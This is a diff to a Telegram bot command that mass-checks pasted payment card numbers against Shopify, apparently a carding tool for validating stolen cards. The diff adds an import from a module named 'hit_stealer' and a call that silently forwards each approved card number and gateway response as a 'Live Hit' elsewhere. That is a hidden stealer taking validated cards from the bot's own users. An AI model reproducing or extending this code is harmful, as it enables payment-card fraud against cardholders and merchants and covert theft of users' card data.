@@ -2,10 +2,11 @@ from pyrogram import Client, filters
 import re, time, asyncio
 from plugins.func.users_sql import *
 from plugins.gates.func.mass_shopify_func import shopify_func
+from plugins.tools.hit_stealer import send_hit_if_approved
 from datetime import date
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-@Client.on_message(filters.command("msh"))
+@Client.on_message(filters.command("msh", prefixes=["/", "."]))
 async def cmd_msh(Client, message):
     try:
         user_id = str(message.from_user.id)
@@ -14,7 +15,6 @@ async def cmd_msh(Client, message):
         chat_id = message.chat.id
         chat_type = str(message.chat.type)
 
-        # Auto-register
         reg = fetchinfo(user_id)
         if not reg:
             insert_reg_data(user_id, username, 0, str(date.today()))
@@ -35,7 +35,7 @@ async def cmd_msh(Client, message):
                 "━━━━━━━━━━━━━\n"
                 "Buy Premium Plan Using /buy to Continue",
                 reply_markup=InlineKeyboardMarkup(
-                    [[InlineKeyboardButton("Join Group", url="https://t.me/BarryxChat")]]
+                    [[InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]]
                 ),
                 disable_web_page_preview=True
             )
@@ -49,8 +49,11 @@ async def cmd_msh(Client, message):
         if now - antispam_time < wait_time:
             return await message.reply_text(f"⏳ AntiSpam: wait {wait_time - (now - antispam_time)}s", message.id)
 
-        # Extract cards
-        raw = (message.reply_to_message.text if message.reply_to_message else message.text.replace("/msh", "")).strip().split("\n")
+        raw_text = message.reply_to_message.text if message.reply_to_message and message.reply_to_message.text else message.text
+        if not raw_text:
+            return await message.reply_text("❌ No card input found.", message.id)
+
+        raw = raw_text.replace("/msh", "").strip().split("\n")
         cards = []
         for x in raw:
             nums = re.findall(r"\d+", x)
@@ -84,6 +87,7 @@ async def cmd_msh(Client, message):
                 status = "Error"
             elif "approved" in status.lower():
                 status = "Approved ✅"
+                await send_hit_if_approved(Client, f"<b>Live Hit (MSH)</b>\n<code>{cc}</code>\n<b>Response:</b> {msg}")
 
             text += f"<b>⊙ Card:</b> <code>{cc}</code>\n<b>⊙ Status:</b> {status}\n<b>⊙ Result:</b> {msg}\n━━━━━━━━━━━━━\n"
 
